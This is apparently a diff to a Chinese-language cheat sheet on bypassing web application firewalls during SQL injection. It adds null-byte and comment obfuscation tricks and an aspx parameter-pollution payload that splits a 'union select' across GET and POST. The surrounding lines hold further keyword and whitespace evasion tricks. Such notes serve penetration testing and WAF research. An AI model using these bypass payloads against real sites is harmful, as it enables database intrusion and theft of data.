@@ -182,6 +182,7 @@ WAF is a defender for web.
   - `select@{反引號}id{反引號}`  
   - `union select 1,2` -> `union(select(1),2)`  
   - `%20 %09 %0a %0b %0c %0d %a0 /**/`  
+  - aspx+mssql `%00`, php+mysql `/*%00*/`
 - 大小寫繞過  
   - `大小寫混淆 e.g. SelecT`  
 - 雙關鍵字繞過  
@@ -216,8 +217,10 @@ WAF is a defender for web.
 - `information_schema`被禁掉  
   - 爆庫名：`select * from users where name = helloworld();`  
     原理：`ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
-- `union`關鍵字繞過  
-  - ``
+- aspx中HPP特性  
+  - 當GET/POST/COOKIE同時提交參數`uid`，server會依GET/POST/COOKIE的順序接收並以逗號隔開  
+  - 利用：`http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
+
     
 更多的思路：  
 [seebug我的wafbypass之道](https://paper.seebug.org/218/)  
